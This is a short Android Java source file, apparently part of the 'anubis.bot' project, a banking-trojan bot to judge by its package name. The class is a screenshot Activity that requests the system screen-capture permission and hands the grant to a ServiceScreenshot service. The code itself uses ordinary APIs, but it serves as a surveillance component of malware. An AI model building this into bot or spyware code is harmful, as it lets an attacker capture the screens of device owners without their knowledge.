package anubis.bot.myapplication.API.Screenshot;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import anubis.bot.myapplication.R;


public class ActivityScreenshot extends Activity {

    private static final int REQUEST_SCREENSHOT=59706;
    private MediaProjectionManager mgr;
    /**************************Activity Lifecycle methods ************************/
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_usage_access_settings);

        mgr=(MediaProjectionManager)getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mgr.createScreenCaptureIntent(), REQUEST_SCREENSHOT);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data){
        if (requestCode==REQUEST_SCREENSHOT) {
            if (resultCode==RESULT_OK) {
                Intent i= new Intent(this, ServiceScreenshot.class)
                            .putExtra(ServiceScreenshot.EXTRA_RESULT_CODE, resultCode)
                            .putExtra(ServiceScreenshot.EXTRA_RESULT_INTENT, data);

                startService(i);
            }
        }
        finish();
    }
    //

}